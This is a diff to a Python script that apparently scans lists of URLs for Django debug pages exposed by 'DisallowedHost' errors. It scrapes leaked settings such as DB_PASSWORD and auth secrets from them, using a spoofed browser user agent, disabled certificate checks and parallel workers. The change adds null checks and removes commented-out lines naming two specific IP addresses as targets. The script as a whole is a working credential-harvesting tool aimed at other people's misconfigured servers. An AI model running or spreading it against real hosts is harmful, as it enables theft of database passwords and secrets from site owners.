@@ -45,42 +45,43 @@ mapping = (
 	'DB_PASSWORD',
 	'ATEL_AUTH_SECRET'
 ) 
-		
 def getHTML(url):
 	headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0'}      
 	r = requests.get(url, headers=headers, verify=False, timeout=15,allow_redirects=True)        
 	return r.text
-	
+
 def checkDjango(url):
 	bodyText=getHTML(url)
-	soup = BeautifulSoup(bodyText, 'html.parser')
-	title=soup.find('title')
-	title=(title.text).replace("\n","")
-	while "  " in title:
-		title=title.replace("  "," ")
-	if "DisallowedHost at /" in title:	
-		foundKeys={}
-		lastFoundKey=''
-		tmpList=bodyText.split("\n")
-		found=False
-		for key in mapping:
-			for x in tmpList:
-				if found==True:
-					soup1=BeautifulSoup(x, 'html.parser')
-					text=(soup1.text).strip()
-					#if "'********************'" not in text:
-					foundKeys[lastFoundKey]=text
-					lastFoundKey=''
-					found=False
-				soup1=BeautifulSoup(x, 'html.parser')
-				text=(soup1.text).strip()
-				if key==text:
-					lastFoundKey=key
-					found=True
-		if len(foundKeys)>0:
-			return url,foundKeys
-		else:
-			return url,None
+	if bodyText!=None:
+		soup = BeautifulSoup(bodyText, 'html.parser')
+		title=soup.find('title')	
+		if title!=None:
+			title=(title.text).replace("\n","")
+			while "  " in title:
+				title=title.replace("  "," ")
+			if "DisallowedHost at /" in title:	
+				foundKeys={}
+				lastFoundKey=''
+				tmpList=bodyText.split("\n")
+				found=False
+				for key in mapping:
+					for x in tmpList:
+						if found==True:
+							soup1=BeautifulSoup(x, 'html.parser')
+							text=(soup1.text).strip()
+							#if "'********************'" not in text:
+							foundKeys[lastFoundKey]=text
+							lastFoundKey=''
+							found=False
+						soup1=BeautifulSoup(x, 'html.parser')
+						text=(soup1.text).strip()
+						if key==text:
+							lastFoundKey=key
+							found=True
+				if len(foundKeys)>0:
+					return url,foundKeys
+				else:
+					return url,None
 	return None,None
 
 parser = optparse.OptionParser()
@@ -95,8 +96,6 @@ if options.filename:
 	with open(options.filename) as f:
 		urlList = f.read().splitlines()
     
-#urlList.append("http://110.8.117.5/")
-#urlList.append("http://165.227.25.182:8000/")
 results={}	
 numOfThreads=10
 p = multiprocessing.Pool(processes=numOfThreads)
